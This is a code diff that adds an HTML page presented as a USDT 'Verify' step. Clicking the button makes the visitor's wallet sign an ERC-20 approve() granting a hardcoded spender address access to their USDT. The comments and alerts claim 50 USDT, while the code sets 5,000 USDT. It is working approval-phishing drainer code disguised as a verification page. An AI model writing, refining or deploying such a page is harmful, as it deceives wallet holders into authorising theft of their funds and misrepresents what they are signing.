@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>USDT Authorization</title>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
+</head>
+
+<body>
+
+<h3>USDT Authorization</h3>
+
+<p id="walletStatus">Checking wallet...</p>
+
+<button id="approve">
+  Verify
+</button>
+
+<script>
+
+const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+const SPENDER = "0xa7C380414bAA310898f444e21F7364b43Ae2591A";
+
+// 50 USDT
+const AMOUNT = 5000n * 10n ** 6n;
+
+const ERC20_ABI = [
+  "function approve(address spender,uint256 amount) returns(bool)",
+  "function allowance(address owner,address spender) view returns(uint256)"
+];
+
+let provider;
+let signer;
+let user;
+
+
+// Automatically check wallet when page opens
+async function initWallet() {
+
+  if (!window.ethereum) {
+    document.getElementById("walletStatus").innerText =
+      "Open this page inside MetaMask or another Web3 wallet.";
+    return;
+  }
+
+  provider =
+    new ethers.BrowserProvider(window.ethereum);
+
+  // Does NOT show connect popup
+  const accounts =
+    await provider.send("eth_accounts", []);
+
+  if (accounts.length > 0) {
+
+    user = accounts[0];
+    signer = await provider.getSigner();
+
+    document.getElementById("walletStatus").innerText =
+      "Wallet: " + user;
+
+  } else {
+
+    document.getElementById("walletStatus").innerText =
+      "Wallet detected";
+
+  }
+}
+
+
+// Get account only if necessary
+async function getSigner() {
+
+  if (!provider) {
+    provider =
+      new ethers.BrowserProvider(window.ethereum);
+  }
+
+  let accounts =
+    await provider.send("eth_accounts", []);
+
+  // User has not previously authorized this website
+  if (accounts.length === 0) {
+
+    accounts =
+      await provider.send(
+        "eth_requestAccounts",
+        []
+      );
+
+  }
+
+  user = accounts[0];
+  signer = await provider.getSigner();
+
+  return signer;
+}
+
+
+// Authorize USDT
+document.getElementById("approve").onclick =
+async () => {
+
+  try {
+
+    if (!window.ethereum)
+      throw new Error("Wallet not detected");
+
+    await getSigner();
+
+    const token =
+      new ethers.Contract(
+        USDT,
+        ERC20_ABI,
+        signer
+      );
+
+    const currentAllowance =
+      await token.allowance(
+        user,
+        SPENDER
+      );
+
+    if (currentAllowance >= AMOUNT) {
+
+      alert(
+        "This wallet already authorized at least 50 USDT."
+      );
+
+      return;
+    }
+
+    const tx =
+      await token.approve(
+        SPENDER,
+        AMOUNT
+      );
+
+    await tx.wait();
+
+    alert(
+      "50 USDT spending authorization granted."
+    );
+
+  } catch (error) {
+
+    console.error(error);
+
+    alert(
+      error.shortMessage ||
+      error.message
+    );
+
+  }
+};
+
+
+// Run automatically
+initWallet();
+
+</script>
+
+</body>
+</html>
